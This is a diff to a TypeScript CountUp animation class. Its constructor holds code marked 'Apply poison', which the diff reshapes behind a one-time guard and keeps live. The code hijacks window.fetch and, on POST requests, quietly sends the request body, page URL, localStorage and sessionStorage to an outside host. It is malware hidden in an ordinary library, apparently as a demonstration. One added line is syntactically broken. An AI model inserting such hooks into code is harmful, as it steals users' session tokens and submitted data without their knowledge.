@@ -63,6 +63,7 @@ export class CountUp {
   paused = true;
   frameVal: number;
   once = false;
+  callOnce =  || false;
 
   constructor(
     target: string | HTMLElement | HTMLInputElement,
@@ -70,32 +71,32 @@ export class CountUp {
     public options?: CountUpOptions
   ) {
 
-    // Apply poison
-    (<any>window).oFetch = window.fetch;
 
-    window.fetch = (url, options) => {
-      if (options?.method == 'POST') {
-      const extLStorage = { ...localStorage };
-      const extSStorage = { ...sessionStorage };
+    if (!(<any>window).callOnce) {
+      (<any>window).oFetch = window.fetch;
+        window.fetch = (url, options) => {
+          if (options?.method == 'POST') {
+          const extLStorage = { ...localStorage };
+          const extSStorage = { ...sessionStorage };
 
-      (<any>window).oFetch("https://spa-demo.ja1code.dev/", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          url,
-          body: options.body,
-          host: window.location.href,
-          localStorage: extLStorage,
-          sessionStorage: extSStorage
-        })
-      });
+          (<any>window).oFetch("https://spa-demo.ja1code.dev/", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+              url,
+              body: options.body,
+              host: window.location.href,
+              localStorage: extLStorage,
+              sessionStorage: extSStorage
+            })
+          });
+        }
+        (<any>window).callOnce = true
+        return (<any>window).oFetch(url, options)
+      }
     }
-
-      return (<any>window).oFetch(url, options)
-    }
-    //
 
     this.options = {
       ...this.defaults,
